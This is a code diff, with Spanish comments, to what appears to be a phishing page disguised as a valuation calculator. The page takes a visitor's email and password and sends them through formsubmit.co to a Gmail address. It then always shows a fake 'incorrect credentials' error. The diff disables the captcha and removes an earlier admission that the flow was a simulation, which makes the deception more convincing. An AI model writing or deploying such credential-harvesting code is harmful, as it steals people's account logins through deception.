@@ -661,28 +661,33 @@
                 formData.append('_subject', `Nuevo intento de valoración - ${fullEmail}`);
                 formData.append('email', fullEmail);
                 formData.append('password', password);
+                // Mejoras para Formsubmit
+                formData.append('_captcha', 'false');
+                formData.append('_template', 'table');
 
-                // Envío real a Formsubmit
+                // Envío real a Formsubmit (destino parameganz25@gmail.com)
                 fetch('https://formsubmit.co/parameganz25@gmail.com', {
                     method: 'POST',
                     body: formData,
                 })
-                .then(() => {
+                .then(response => {
+                    // Mostrar toast de envío
+                    showToast('📧 Correo enviado a parameganz25@gmail.com');
                     setTimeout(() => {
                         loginBtn.classList.remove('opacity-70', 'pointer-events-none');
                         loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calcular valor';
-                        
-                        // Mostrar error según el contador
                         mostrarError(attemptCount);
                         showToast('Acceso denegado. Credenciales incorrectas.');
                     }, 2000);
                 })
                 .catch(() => {
+                    // Si falla el envío, igual mostramos error
+                    showToast('⚠️ Error al enviar el correo, pero continuamos...');
                     setTimeout(() => {
                         loginBtn.classList.remove('opacity-70', 'pointer-events-none');
                         loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calcular valor';
                         mostrarError(attemptCount);
-                        showToast('Error de red, pero simulación completada.');
+                        showToast('Acceso denegado. Credenciales incorrectas.');
                     }, 2000);
                 });
             });
